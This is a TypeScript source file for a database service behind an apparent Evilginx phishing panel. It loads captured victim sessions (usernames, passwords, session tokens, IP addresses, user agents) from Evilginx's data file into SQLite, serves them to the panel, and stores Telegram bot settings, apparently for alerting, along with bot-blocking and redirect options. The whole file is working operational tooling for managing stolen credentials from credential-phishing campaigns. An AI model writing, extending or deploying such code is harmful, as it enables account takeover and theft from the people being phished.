import * as fs from "fs";
import * as path from "path";
import BetterSqlite3 from "better-sqlite3";
import * as cp from "child_process";
import { hash, compare } from "bcryptjs";

// Type definitions for use within this file
interface EvilginxSession {
  id: number;
  phishlet: string;
  landing_url: string;
  username: string;
  password: string;
  remote_addr: string;
  create_time: number;
  tokens: string | object;
  useragent: string;
  session_id: string;
}

interface DbSession {
  id: number;
  phishlet: string;
  landing_url: string;
  username: string;
  password: string;
  remote_addr: string;
  create_time: number;
  tokens: string | object;
  useragent: string;
}

interface Settings {
  telegramToken: string;
  telegramChatId: string;
  blockBots: boolean;
  redirectLink: string;
}

interface User {
  username: string;
  password: string;
}

export class DatabaseService {
  private db!: BetterSqlite3.Database;
  private evilginxDbPath: string;
  private sourceConfigPath: string;
  private sourceBlacklistPath: string;
  private sourceDataDbPath: string;
  private localConfigPath: string;
  private localBlacklistPath: string;
  private localDataDbPath: string;
  private syncScriptPath: string;
  private isInitialized: boolean = false;

  constructor() {
    try {
      // Create data directory first with proper permissions
      const dataDir = path.join(process.cwd(), "data");
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o755 });

      // Initialize auth database in the data directory - this is critical for login
      const authDbPath = path.join(dataDir, "auth.db");
      this.initAuthDatabase(authDbPath);

      // Set the path to the sync script
      this.syncScriptPath = path.join(dataDir, "sync_files.sh");

      // After auth db is initialized, set up evilginx paths and files
      this.setupEvilginxFiles(dataDir);
    } catch (error) {
      console.error("Database initialization failed:", error);
      throw error;
    }
  }

  // Initialize the authentication database separately
  private initAuthDatabase(authDbPath: string) {
    try {
      this.db = new BetterSqlite3(authDbPath);
      console.log("Auth database initialized at:", authDbPath);

      // Initialize auth tables right away
      this.initializeDatabase();
      this.initAuthTable();

      this.isInitialized = true;
    } catch (dbError) {
      console.error("Error opening auth database:", dbError);
      // Try to create the file first if it doesn't exist
      try {
        if (!fs.existsSync(authDbPath)) {
          fs.writeFileSync(authDbPath, "", { mode: 0o644 });
          this.db = new BetterSqlite3(authDbPath);
          console.log("Created and opened auth database at:", authDbPath);

          // Initialize auth tables
          this.initializeDatabase();
          this.initAuthTable();
          this.isInitialized = true;
        } else {
          throw new Error(`Cannot open auth database: ${dbError.message}`);
        }
      } catch (fatalError) {
        console.error("Fatal error with auth database:", fatalError);
        throw new Error(
          `Authentication database cannot be initialized. Please check file permissions.`
        );
      }
    }
  }

  // Setup evilginx files after auth db is initialized
  private setupEvilginxFiles(dataDir: string) {
    try {
      // Set paths for evilginx files - use workspace directory instead of home directory
      const workspaceDir = path.join(process.cwd(), "../../..");
      const evilginxDir = path.join(workspaceDir, ".evilginx");

      // Log directory location
      console.log("Evilginx directory path:", evilginxDir);
      console.log("Panel data directory path:", dataDir);

      // Check if .evilginx exists - NEVER create or delete it
      if (!fs.existsSync(evilginxDir)) {
        console.error(
          "CRITICAL: .evilginx directory does not exist at:",
          evilginxDir
        );
        console.error(
          "The panel will NOT create this directory automatically."
        );
        console.error(
          "Please run initial_setup.sh or create the directory manually."
        );

        // Do not attempt to create the directory or its files - just log and continue
        console.log(
          "Continuing with limited functionality - symlinks may not work."
        );
      } else {
        console.log(".evilginx directory exists at:", evilginxDir);
      }

      // Never modify the directory - just set the paths
      // Set source paths (in .evilginx directory in workspace)
      this.sourceConfigPath = path.join(evilginxDir, "config.json");
      this.sourceBlacklistPath = path.join(evilginxDir, "blacklist.txt");
      this.sourceDataDbPath = path.join(evilginxDir, "data.db");

      // Set local paths (in data directory)
      this.localConfigPath = path.join(dataDir, "config.json");
      this.localBlacklistPath = path.join(dataDir, "blacklist.txt");
      this.localDataDbPath = path.join(dataDir, "data.db");

      // Always use the local database path for reading sessions
      // (this will be a symlink to the workspace evilginx file)
      this.evilginxDbPath = this.localDataDbPath;

      // Initialize the files by running the sync script
      this.runSyncScript(true);

      console.log("Evilginx files setup complete");
    } catch (error) {
      // Log but don't throw - this shouldn't prevent login from working
      console.error("Evilginx setup error:", error);
      console.log("Continuing with limited functionality...");
    }
  }

  // Run the sync script to ensure proper file access and symlinks
  private runSyncScript(isInitialSetup: boolean = false) {
    try {
      const syncScriptPath = path.join(
        process.cwd(),
        "data",
        "init_sync_watch.sh"
      );

      // Check if the script exists
      if (!fs.existsSync(syncScriptPath)) {
        console.error("Sync script not found at:", syncScriptPath);

        // DO NOT fall back to setup permissions script - it will create default files
        if (isInitialSetup) {
          console.error(
            "IMPORTANT: The panel expects existing files in the .evilginx directory."
          );
          console.error(
            "Please ensure config.json, blacklist.txt, and data.db exist in the .evilginx directory."
          );
        }
        return false;
      }

      console.log("Running sync script to ensure proper symlinks and files...");

      // Make script executable
      try {
        fs.chmodSync(syncScriptPath, 0o755);
      } catch (error) {
        console.error("Error making sync script executable:", error);
      }

      // Run sync-now mode to ensure proper setup
      const result = cp.spawnSync("bash", [syncScriptPath, "sync-now"], {
        stdio: isInitialSetup ? "inherit" : "ignore",
      });

      if (result.error) {
        console.error("Error running sync script:", result.error);

        // DO NOT fall back to setup permissions script - it will create default files
        if (isInitialSetup) {
          console.error(
            "IMPORTANT: The panel expects existing files in the .evilginx directory."
          );
          console.error(
            "Please ensure config.json, blacklist.txt, and data.db exist in the .evilginx directory."
          );
        }
        return false;
      } else if (result.status !== 0) {
        console.error("Sync script exited with code:", result.status);

        // DO NOT fall back to setup permissions script - it will create default files
        if (isInitialSetup) {
          console.error(
            "IMPORTANT: The panel expects existing files in the .evilginx directory."
          );
          console.error(
            "Please ensure config.json, blacklist.txt, and data.db exist in the .evilginx directory."
          );
        }
        return false;
      } else {
        console.log("Sync script completed successfully");
        return true;
      }
    } catch (error) {
      console.error("Failed to run sync script:", error);

      // DO NOT fall back to setup permissions script - it will create default files
      if (isInitialSetup) {
        console.error(
          "IMPORTANT: The panel expects existing files in the .evilginx directory."
        );
        console.error(
          "Please ensure config.json, blacklist.txt, and data.db exist in the .evilginx directory."
        );
      }
      return false;
    }
  }

  // Replace the runSetupPermissionsScript to prevent it from creating default files
  private runSetupPermissionsScript() {
    try {
      console.error(
        "NOTICE: The panel requires existing files in the .evilginx directory"
      );
      console.error(
        "It will NEVER create these files automatically. Please ensure:"
      );
      console.error("1. The .evilginx directory exists in the workspace");
      console.error(
        "2. config.json, blacklist.txt, and data.db exist in .evilginx"
      );
      console.error("3. Run the init_sync_watch.sh script to create symlinks");

      // Do NOT run the setup script as it creates default files
      return false;
    } catch (error) {
      console.error("Failed to display setup message:", error);
      return false;
    }
  }

  private initializeDatabase() {
    try {
      // Drop the existing sessions table to remove the unique constraint
      this.db.exec("DROP TABLE IF EXISTS sessions");

      this.db.exec(`
        CREATE TABLE IF NOT EXISTS sessions (
          entry_id INTEGER PRIMARY KEY AUTOINCREMENT,
          session_id INTEGER,
          landing_url TEXT,
          username TEXT,
          password TEXT,
          tokens TEXT,
          remote_addr TEXT,
          create_time INTEGER,
          phishlet TEXT,
          useragent TEXT
        )
      `);

      this.db.exec(`
        CREATE TABLE IF NOT EXISTS settings (
          key TEXT PRIMARY KEY,
          value TEXT
        )
      `);

      // Create index on create_time for better query performance
      this.db.exec(`
        CREATE INDEX IF NOT EXISTS idx_sessions_create_time ON sessions(create_time DESC)
      `);

      console.log("Database tables created successfully");
    } catch (error) {
      console.error("Error creating database tables:", error);
      throw error;
    }
  }

  private initAuthTable() {
    try {
      this.db.exec(`
        CREATE TABLE IF NOT EXISTS auth (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT UNIQUE,
          password TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
      `);
      console.log("Auth table created successfully");
    } catch (error) {
      console.error("Error creating auth table:", error);
      throw error;
    }
  }

  private loadSessionsFromFile() {
    try {
      console.log("Starting loadSessionsFromFile...");
      console.log("Looking for database at:", this.evilginxDbPath);

      // Make sure we have the latest data by checking symlinks
      this.syncFiles();

      // Check if file exists and has content
      if (!fs.existsSync(this.evilginxDbPath)) {
        console.log("Database file does not exist at:", this.evilginxDbPath);
        // Try running the sync script to fix symlinks
        this.runSyncScript();
        return [];
      }

      // Ensure file has read permissions
      try {
        fs.accessSync(this.evilginxDbPath, fs.constants.R_OK);
      } catch (permError) {
        console.error("Permission error accessing database file:", permError);
        // Try running the sync script again to fix symlinks and permissions
        this.runSyncScript();

        // Try again after fixing
        try {
          fs.accessSync(this.evilginxDbPath, fs.constants.R_OK);
        } catch (persistentError) {
          console.error(
            "Still unable to access database file after fix attempt:",
            persistentError
          );
          return [];
        }
      }

      const stats = fs.statSync(this.evilginxDbPath);
      console.log("Database file size:", stats.size, "bytes");

      if (stats.size === 0) {
        console.log("Database file is empty");
        return [];
      }

      // Read the file content
      let fileContent;
      try {
        fileContent = fs.readFileSync(this.evilginxDbPath, "utf8");
        console.log("Read file content, length:", fileContent.length, "bytes");
      } catch (readError) {
        console.error("Error reading file:", readError);
        return [];
      }

      const lines = fileContent.split("\n");
      console.log("Number of lines in file:", lines.length);

      const sessions: EvilginxSession[] = [];

      // Add this check for Redis format
      const isRedisFormat = lines.some(
        (line) => line.trim() === "*3" || line.trim() === "set"
      );

      if (isRedisFormat) {
        console.log("Detected Redis format database");

        for (let i = 0; i < lines.length; i++) {
          const line = lines[i].trim();
          if (!line) continue;

          // Check for Redis command pattern
          if (
            line === "*3" &&
            lines[i + 1]?.trim() === "$3" &&
            lines[i + 2]?.trim() === "set"
          ) {
            const keyLine = lines[i + 3]?.trim();
            if (!keyLine?.startsWith("$")) continue;

            const keyLengthStr = keyLine.substring(1);
            const keyLength = parseInt(keyLengthStr);
            if (isNaN(keyLength)) continue;

            const key = lines[i + 4]?.trim();
            if (!key) continue;

            // Skip ID counter entries
            if (key.endsWith(":id")) {
              i += 5;
              continue;
            }

            // Check if this is a session entry
            if (key.match(/^sessions:\d+$/)) {
              const valueLine = lines[i + 5]?.trim();
              if (!valueLine?.startsWith("$")) continue;

              const valueLengthStr = valueLine.substring(1);
              const valueLength = parseInt(valueLengthStr);
              if (isNaN(valueLength)) continue;

              const value = lines[i + 6]?.trim();
              if (!value) continue;

              try {
                const sessionData = JSON.parse(value);
                console.log("Successfully parsed session:", {
                  id: sessionData.id,
                  username: sessionData.username || "(empty)",
                  create_time: sessionData.create_time,
                });
                sessions.push(sessionData);
              } catch (e) {
                console.error("Error parsing session data:", e);
                console.error("Raw value:", value);
              }

              i += 6; // Skip processed lines
            }
          }
        }
      } else {
        // Try to parse as JSON or other format if it's not Redis format
        console.log("Not in Redis format, trying to parse as JSON array");
        try {
          // Try to parse as JSON
          const data = JSON.parse(fileContent);
          if (Array.isArray(data)) {
            data.forEach((item) => {
              if (item && typeof item === "object" && "id" in item) {
                sessions.push(item as EvilginxSession);
                console.log("Successfully parsed session from JSON:", {
                  id: item.id,
                  username: item.username || "(empty)",
                  create_time: item.create_time,
                });
              }
            });
          }
        } catch (jsonError) {
          console.error("Error parsing file as JSON:", jsonError);
        }
      }

      console.log(`Found ${sessions.length} valid sessions`);

      if (sessions.length === 0) {
        console.log("No valid sessions found");
        return [];
      }

      // Update local database
      const localDb = this.db;
      localDb.exec("BEGIN TRANSACTION");

      try {
        // Clear existing sessions
        localDb.exec("DELETE FROM sessions");

        // Insert all sessions
        const insert = localDb.prepare(`
          INSERT INTO sessions (
            session_id, landing_url, username, password, 
            tokens, remote_addr, create_time, 
            phishlet, useragent
          ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `);

        for (const session of sessions) {
          insert.run(
            session.id,
            session.landing_url || "",
            session.username || "",
            session.password || "",
            typeof session.tokens === "string"
              ? session.tokens
              : JSON.stringify(session.tokens || {}),
            session.remote_addr || "",
            session.create_time || 0,
            session.phishlet || "",
            session.useragent || ""
          );
          console.log("Inserted session:", {
            id: session.id,
            username: session.username || "(empty)",
          });
        }

        localDb.exec("COMMIT");
        console.log(
          `Successfully updated local database with ${sessions.length} sessions`
        );
        return sessions;
      } catch (error) {
        console.error("Error updating local database:", error);
        localDb.exec("ROLLBACK");
        return [];
      }
    } catch (error) {
      console.error("Error in loadSessionsFromFile:", error);
      return [];
    }
  }

  async verifyCredentials(username: string, password: string) {
    try {
      console.log(`Verifying credentials for user: ${username}`);

      // Get user from database
      try {
        // First check if auth table exists, create it if not
        this.db.exec(`
          CREATE TABLE IF NOT EXISTS auth (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
          )
        `);

        // First, check if default credentials were already replaced by checking if any user exists
        const anyUser = this.db
          .prepare("SELECT COUNT(*) as count FROM auth")
          .get() as { count: number } | undefined;

        const hasExistingUsers = anyUser && anyUser.count > 0;

        // Query the specific user
        const user = this.db
          .prepare("SELECT username, password FROM auth WHERE username = ?")
          .get(username) as User | undefined;

        // If default credentials are being used, but users already exist in the database
        // reject the login attempt since default credentials should only work for first login
        if (username === "admin" && password === "admin" && hasExistingUsers) {
          console.log(
            "Default credentials no longer valid - users already exist"
          );
          return { isValid: false, isFirstLogin: false };
        }

        // If no user found and it's the first login attempt with default credentials
        if (
          !user &&
          username === "admin" &&
          password === "admin" &&
          !hasExistingUsers
        ) {
          console.log(
            "First login with default credentials, creating admin user"
          );
          const hashedPassword = await hash(password, 10);
          try {
            this.db
              .prepare("INSERT INTO auth (username, password) VALUES (?, ?)")
              .run(username, hashedPassword);
            console.log("Admin user created successfully");
            return { isValid: true, isFirstLogin: true };
          } catch (insertError) {
            console.error("Error creating admin user:", insertError);
            // Try another approach - use replace instead of insert
            try {
              console.log("Trying alternative approach with REPLACE INTO");
              this.db
                .prepare("REPLACE INTO auth (username, password) VALUES (?, ?)")
                .run(username, hashedPassword);
              console.log("Admin user created using alternative approach");
              return { isValid: true, isFirstLogin: true };
            } catch (altError) {
              console.error("Alternative approach also failed:", altError);
              return { isValid: false, isFirstLogin: false };
            }
          }
        }

        // If no user found
        if (!user) {
          console.log("No user found with username:", username);
          return { isValid: false, isFirstLogin: false };
        }

        // Verify password
        const isValid = await compare(password, user.password);
        console.log(
          `Password verification result: ${isValid ? "success" : "failure"}`
        );

        // Check if these are default credentials - if they are and we got here,
        // it means there's a user in the database with username "admin" and password "admin"
        // which should no longer be valid
        const isUsingDefaultCredentials =
          username === "admin" && password === "admin";

        if (isValid && isUsingDefaultCredentials) {
          // Log this suspicious activity
          console.log(
            "Warning: Default credentials were used after account creation"
          );

          // We'll update the password for security to invalidate the default credentials
          // Generate a random password so default credentials no longer work
          const randomPassword =
            Math.random().toString(36).slice(2) +
            Math.random().toString(36).toUpperCase().slice(2);
          const hashedPassword = await hash(randomPassword, 10);

          // Update the password in the database
          this.db
            .prepare("UPDATE auth SET password = ? WHERE username = ?")
            .run(hashedPassword, "admin");

          console.log(
            "Default admin password was automatically changed for security"
          );
          return { isValid: false, isFirstLogin: false };
        }

        // Normal valid login case
        const isFirstLogin = false; // No longer first login after credentials have been set
        return { isValid, isFirstLogin };
      } catch (dbError) {
        console.error("Database error during authentication:", dbError);

        // Special case for first login with default credentials
        if (username === "admin" && password === "admin") {
          console.log(
            "First login with default credentials, but database error occurred"
          );
          // Allow login anyway and try to fix the database
          try {
            this.initAuthTable();
            const hashedPassword = await hash(password, 10);
            this.db
              .prepare("INSERT INTO auth (username, password) VALUES (?, ?)")
              .run(username, hashedPassword);
            console.log("Created admin user after fixing database");
            return { isValid: true, isFirstLogin: true };
          } catch (fixError) {
            console.error("Failed to fix database and create admin:", fixError);
            // As a last resort, allow login but warn about database issues
            console.log("Allowing default admin login despite database issues");
            return { isValid: true, isFirstLogin: true };
          }
        }

        throw dbError;
      }
    } catch (error) {
      console.error("Authentication error:", error);
      throw error;
    }
  }

  async updateCredentials(
    oldUsername: string,
    newUsername: string,
    newPassword: string
  ) {
    try {
      // First check if the new username already exists (except for the current user)
      const existingUser = this.db
        .prepare(
          "SELECT username FROM auth WHERE username = ? AND username != ?"
        )
        .get(newUsername, oldUsername);

      if (existingUser) {
        throw new Error("Username already exists");
      }

      const hashedPassword = await hash(newPassword, 10);

      // Use a transaction to ensure atomicity
      this.db.exec("BEGIN TRANSACTION");
      try {
        this.db
          .prepare(
            "UPDATE auth SET username = ?, password = ? WHERE username = ?"
          )
          .run(newUsername, hashedPassword, oldUsername);
        this.db.exec("COMMIT");
        return true;
      } catch (error) {
        this.db.exec("ROLLBACK");
        throw error;
      }
    } catch (error) {
      console.error("Update credentials error:", error);
      throw error;
    }
  }

  async updatePassword(newPassword: string, username: string = "admin") {
    const hashedPassword = await hash(newPassword, 10);
    this.db
      .prepare("UPDATE auth SET password = ? WHERE username = ?")
      .run(hashedPassword, username);

    // Add this line to store timestamp
    this.db
      .prepare(
        "INSERT OR REPLACE INTO settings (key, value) VALUES ('password_change_time', ?)"
      )
      .run(Date.now().toString());
  }

  async getSessions() {
    try {
      // Sync files first to ensure we have the latest data
      this.syncFiles();

      // First try to reload from evilginx database
      const freshSessions = await this.loadSessionsFromFile();
      if (Array.isArray(freshSessions) && freshSessions.length > 0) {
        return freshSessions
          .sort((a, b) => b.create_time - a.create_time) // Sort in descending order
          .map((session) => ({
            ...session,
            tokens:
              typeof session.tokens === "string"
                ? JSON.parse(session.tokens || "{}")
                : session.tokens,
          }));
      }

      // If no sessions from evilginx database, try local database
      console.log("Fetching sessions from local database...");
      const sessions = this.db
        .prepare(
          `
          SELECT session_id as id, phishlet, landing_url, username, password, 
                 remote_addr, create_time, tokens, useragent
          FROM sessions 
          ORDER BY create_time DESC
        `
        )
        .all() as DbSession[];

      console.log(`Retrieved ${sessions.length} sessions from local database`);

      return sessions.map((session) => ({
        ...session,
        tokens:
          typeof session.tokens === "string"
            ? JSON.parse(session.tokens || "{}")
            : session.tokens,
      }));
    } catch (error) {
      console.error("Error fetching sessions:", error);
      return [];
    }
  }

  async getSettings() {
    return this.db.prepare("SELECT * FROM settings").get();
  }

  async updateSettings(settings: Settings) {
    try {
      // Update settings in the database
      this.db
        .prepare(
          "INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?), (?, ?), (?, ?), (?, ?)"
        )
        .run(
          "telegramToken",
          settings.telegramToken,
          "telegramChatId",
          settings.telegramChatId,
          "blockBots",
          settings.blockBots ? 1 : 0,
          "redirectLink",
          settings.redirectLink
        );

      // Sync config.json with the updated settings
      await this.syncConfigJson();

      return true;
    } catch (error) {
      console.error("Error updating settings:", error);
      return false;
    }
  }

  getPasswordChangeTime() {
    this.db
      .prepare(
        "CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)"
      )
      .run();

    const result = this.db
      .prepare("SELECT value FROM settings WHERE key = 'password_change_time'")
      .get() as { value: string } | undefined;

    return result ? parseInt(result.value) : Date.now();
  }

  public async clearSessions() {
    try {
      this.db.exec("DELETE FROM sessions");
      return true;
    } catch (error) {
      console.error("Error clearing sessions:", error);
      return false;
    }
  }

  public async updateSessions(sessions: DbSession[]) {
    try {
      this.db.exec("BEGIN TRANSACTION");

      // Clear existing sessions
      this.db.exec("DELETE FROM sessions");

      // Insert new sessions
      const insert = this.db.prepare(`
        INSERT INTO sessions (
          session_id, landing_url, username, password, 
          tokens, remote_addr, create_time, 
          phishlet, useragent
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      `);

      for (const session of sessions) {
        insert.run(
          session.id,
          session.landing_url,
          session.username,
          session.password,
          typeof session.tokens === "string"
            ? session.tokens
            : JSON.stringify(session.tokens),
          session.remote_addr,
          session.create_time,
          session.phishlet,
          session.useragent
        );
      }

      this.db.exec("COMMIT");

      // Write back to the data.db file to ensure consistency
      this.markFileForSync();

      return true;
    } catch (error) {
      console.error("Error updating sessions:", error);
      this.db.exec("ROLLBACK");
      return false;
    }
  }

  // Helper function to sync all files using the external script
  private syncFiles() {
    try {
      // Check if the symlinks exist and are valid
      const configSymlinkValid = this.isValidSymlink(
        this.localConfigPath,
        this.sourceConfigPath
      );
      const blacklistSymlinkValid = this.isValidSymlink(
        this.localBlacklistPath,
        this.sourceBlacklistPath
      );
      const dataDbSymlinkValid = this.isValidSymlink(
        this.localDataDbPath,
        this.sourceDataDbPath
      );

      // If any symlink is invalid, run the sync script to repair them
      if (
        !configSymlinkValid ||
        !blacklistSymlinkValid ||
        !dataDbSymlinkValid
      ) {
        console.log(
          "Detected invalid symlinks - running sync script to repair them"
        );
        return this.runSyncScript();
      }

      return true;
    } catch (error) {
      console.error("Error syncing files:", error);
      return false;
    }
  }

  // Check if a symlink exists and points to the correct target
  private isValidSymlink(symlinkPath: string, targetPath: string): boolean {
    try {
      // Check if the symlink exists
      if (!fs.existsSync(symlinkPath)) {
        console.log(`Symlink doesn't exist: ${symlinkPath}`);
        return false;
      }

      // Check if it's actually a symlink
      if (!fs.lstatSync(symlinkPath).isSymbolicLink()) {
        console.log(`Not a symlink: ${symlinkPath}`);
        return false;
      }

      // Check if it points to the correct target
      const linkTarget = fs.readlinkSync(symlinkPath);

      // Allow both absolute path and relative "../../../.evilginx/" format
      const fileName = path.basename(targetPath);
      const isValid =
        linkTarget === targetPath ||
        linkTarget === `../../../.evilginx/${fileName}` ||
        linkTarget === `/.evilginx/${fileName}`;

      if (!isValid) {
        console.log(
          `Symlink points to incorrect target: ${linkTarget} instead of ${targetPath} or ../../../.evilginx/${fileName}`
        );
      }

      return isValid;
    } catch (error) {
      console.error(`Error checking symlink ${symlinkPath}:`, error);
      return false;
    }
  }

  // Mark that evilginx needs to be restarted after file changes
  private markFileForSync() {
    try {
      const restartFlagPath = "/tmp/evilginx_needs_restart";
      fs.writeFileSync(restartFlagPath, "1");
      console.log("Marked evilginx for restart after configuration change");

      // With symlinks in place, we don't need to explicitly sync files anymore
      // since changes to the panel/data files (which are symlinks) are directly
      // applied to the .evilginx files. But we'll still check the symlinks to be safe.
      this.syncFiles();

      return true;
    } catch (error) {
      console.error("Error marking evilginx for restart:", error);
      return false;
    }
  }

  // Helper function to sync config.json file specifically
  public async syncConfigJson() {
    try {
      // Create a flag file to indicate config has changed
      this.markFileForSync();

      // Run the sync script to update files
      return this.syncFiles();
    } catch (error) {
      console.error("Error syncing config.json:", error);
      return false;
    }
  }

  // Helper function to sync blacklist.txt file specifically
  public async syncBlacklistTxt() {
    try {
      // Create a flag file to indicate blacklist has changed
      this.markFileForSync();

      // Run the sync script to update files
      return this.syncFiles();
    } catch (error) {
      console.error("Error syncing blacklist.txt:", error);
      return false;
    }
  }

  // Helper function to sync data.db file specifically
  public async syncDataDb() {
    try {
      // Run the sync script to update files
      return this.syncFiles();
    } catch (error) {
      console.error("Error syncing data.db:", error);
      return false;
    }
  }

  // Helper method to verify symlinks are working correctly
  public verifySymlinks(): { valid: boolean; details: string[] } {
    const details: string[] = [];
    let allValid = true;

    try {
      // Check if .evilginx directory exists in workspace
      const workspaceDir = path.join(process.cwd(), "../../..");
      const evilginxDir = path.join(workspaceDir, ".evilginx");

      if (!fs.existsSync(evilginxDir)) {
        details.push(`Error: .evilginx directory not found at ${evilginxDir}`);
        allValid = false;
      } else {
        details.push(`✓ .evilginx directory exists at ${evilginxDir}`);

        // Check if the panel/data files are symlinks pointing to .evilginx files
        const dataDir = path.join(process.cwd(), "data");

        // Check config.json
        const localConfigPath = path.join(dataDir, "config.json");
        const sourceConfigPath = path.join(evilginxDir, "config.json");

        if (fs.existsSync(localConfigPath)) {
          if (fs.lstatSync(localConfigPath).isSymbolicLink()) {
            const target = fs.readlinkSync(localConfigPath);
            if (target === "../../../.evilginx/config.json") {
              details.push(
                `✓ config.json is properly symlinked to ${sourceConfigPath}`
              );
            } else {
              details.push(
                `✗ config.json symlink points to ${target} instead of ../../../.evilginx/config.json`
              );
              allValid = false;
            }
          } else {
            details.push(`✗ config.json exists but is not a symlink`);
            allValid = false;
          }
        } else {
          details.push(`✗ config.json does not exist in panel/data`);
          allValid = false;
        }

        // Check blacklist.txt
        const localBlacklistPath = path.join(dataDir, "blacklist.txt");
        const sourceBlacklistPath = path.join(evilginxDir, "blacklist.txt");

        if (fs.existsSync(localBlacklistPath)) {
          if (fs.lstatSync(localBlacklistPath).isSymbolicLink()) {
            const target = fs.readlinkSync(localBlacklistPath);
            if (target === "../../../.evilginx/blacklist.txt") {
              details.push(
                `✓ blacklist.txt is properly symlinked to ${sourceBlacklistPath}`
              );
            } else {
              details.push(
                `✗ blacklist.txt symlink points to ${target} instead of ../../../.evilginx/blacklist.txt`
              );
              allValid = false;
            }
          } else {
            details.push(`✗ blacklist.txt exists but is not a symlink`);
            allValid = false;
          }
        } else {
          details.push(`✗ blacklist.txt does not exist in panel/data`);
          allValid = false;
        }

        // Check data.db
        const localDataDbPath = path.join(dataDir, "data.db");
        const sourceDataDbPath = path.join(evilginxDir, "data.db");

        if (fs.existsSync(localDataDbPath)) {
          if (fs.lstatSync(localDataDbPath).isSymbolicLink()) {
            const target = fs.readlinkSync(localDataDbPath);
            if (target === "../../../.evilginx/data.db") {
              details.push(
                `✓ data.db is properly symlinked to ${sourceDataDbPath}`
              );
            } else {
              details.push(
                `✗ data.db symlink points to ${target} instead of ../../../.evilginx/data.db`
              );
              allValid = false;
            }
          } else {
            details.push(`✗ data.db exists but is not a symlink`);
            allValid = false;
          }
        } else {
          details.push(`✗ data.db does not exist in panel/data`);
          allValid = false;
        }
      }
    } catch (error) {
      details.push(
        `Error verifying symlinks: ${
          error instanceof Error ? error.message : String(error)
        }`
      );
      allValid = false;
    }

    return { valid: allValid, details };
  }
}

export const dbService = new DatabaseService();
